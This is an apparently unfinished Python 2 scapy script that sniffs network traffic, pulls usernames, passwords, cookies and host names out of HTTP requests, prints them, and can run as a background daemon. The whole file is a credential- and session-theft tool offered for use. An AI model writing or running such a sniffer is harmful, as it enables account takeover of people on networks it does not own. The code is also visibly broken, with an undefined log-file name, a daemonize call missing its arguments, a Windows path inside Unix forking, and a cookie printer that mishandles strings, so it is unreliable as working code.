import re
import socket
import logging
import getopt
from scapy.all import *
from HTTP import *

LOG = '/scapy.log'
PIDFILE = '/scapy.pid'

#conf.iface   = 'eth0'
conf.verb    = 0
conf.promisc = 0

last_ftp_login = ''
last_ftp_pw    = ''

login_success = 'success'
login_failure = 'failure'

log = None
shownext = False
credentials = ()
cookies = ""
hostname=""

def getCookies(pkt):
    raw = pkt.sprintf("%Raw.load%")
    try:
        cookiestr = [l[7:] for l in raw.split("\\r\\n") if l.lower().startswith("cookie")][0]
        #return [map(lambda x:x.strip(), c.split('=', 1)) for c in cookiestr.split(';')]
        return cookiestr
    except IndexError:
        return None

def getCredentials(pkt):
    raw = pkt.sprintf("%Raw.load%")
    fields = raw.split("&")
    
    try:
        matches = []
        for f in fields:
            matches.append(re.findall("u(?:ser)?(?:name)?=(.+)", f))
        username =  [m for m in matches if len(m)>0][0][0]
        
        matches = []
        for f in fields:
            matches.append(re.findall("p(?:ass)?w?(?:or)?d?=(.+)", f))
        password =  [m for m in matches if len(m)>0][0][0]
        
        return (username, password)
    except IndexError:
        return None

def getPacketInfo(pkt):
    global hostname, cookies, credentials, log
    
    if shownext:
        cookies = getCookies(pkt)
        try:
            hostname = re.findall("Host: (.*)\\r\\n", pkt.sprintf("%HTTP.Host%"))[0]
        except IndexError, e:
            print pkt.sprintf("%HTTP.Host%")
            raise e
    else:
        credentials = getCredentials(pkt)
        if credentials or cookies:
            hline = hostname+"    |"
            print "\n\n"+hline+"\n"+"="*(len(hline)-1)
        if credentials is not None: print "\nCredentials:\n------------\nUsername:\t",credentials[0],"\nPassword:\t",credentials[1]
        if cookies is not None: print "\nCookies:\n--------\n","\n".join(["  :  ".join(cpair) for cpair in cookies])
    """
    src   = pkt.sprintf("%IP.src%")
    dst   = pkt.sprintf("%IP.dst%")
    sport = pkt.sprintf("%IP.sport%")
    dport = pkt.sprintf("%IP.dport%")
    raw   = pkt.sprintf("%Raw.load%")
    rawlines = raw.split("\\r\\n")
    print src, dst, sport, dport, "\n".join(rawlines), '\n'
    """

def callback(pkt):
    global log
    global shownext
    sport = pkt.sprintf("%IP.sport%")
    dport = pkt.sprintf("%IP.dport%")
    raw   = pkt.sprintf("%Raw.load%")
    if HTTPrequest in pkt:
        shownext = True
        getPacketInfo(pkt)
    elif shownext:
        shownext = False
        getPacketInfo(pkt)


def daemonize(stdin, stdout, stderr):
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError, e:
        sys.stderr.write("fork #1 failed: (%d) %s\n" % (e.errno, e.strerror))
        sys.exit(1)
    
    os.chdir("C:\\")
    os.umask(0)
    os.setsid()
    
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError, e:
        sys.stderr.write("fork #1 failed: (%d) %s\n" % (e.errno, e.strerror))
        sys.exit(1)
    
    si = open(stdin, 'r')
    so = open(stdout, 'a+')
    se = open(stderr, 'a+', 0)
    os.dup2(si.fileno(), sys.stdin.fileno())
    os.dup2(so.fileno(), sys.stdout.fileno())
    os.dup2(se.fileno(), sys.stderr.fileno())
    
def main():
    global log
    
    debugMode   = False
    consoleMode = False
    
    try:
        opts, args = getopt.getopt(sys.argv[1:], 'cdh', ['console', 'debug', 'help'])
    except getopt.error, msg:
        print msg
        print 'for help use --help'
        sys.exit(2)
        
    for o, a in opts:
        if o in ('-h', '--help'):
            printUsage()
            return 
        if o in ('-d', '--debug'):
            debugMode = True
        if o in ('-c', '--console'):
            consoleMode = True
    
    
    log = logging.getLogger('ftp_password_sniffer')
    
    if consoleMode:
        handler = logging.StreamHandler()
    else:
        handler = logging.FileHandler(LOGFILE)
    
    formatter = logging.Formatter('%(asctime)s %(levelname)s %(message)s')
    handler.setFormatter(formatter)
    log.addHandler(handler)
    
    if not debugMode:
        log.setLevel(logging.INFO)
    else:
        log.setLevel(logging.DEBUG)
    
    expr = 'tcp'
    log.info("Listening for: " + expr)
    
    if debugMode:
        log.info("Debug mode activated")
    
    if consoleMode:
        log.info("Console mode activated.")
    else:
        daemonize()
    
    try:
        sniff(filter=expr, prn=callback, store=0)
    except KeyboardInterrupt:
        exit(0)

if __name__ == "__main__":
    main()
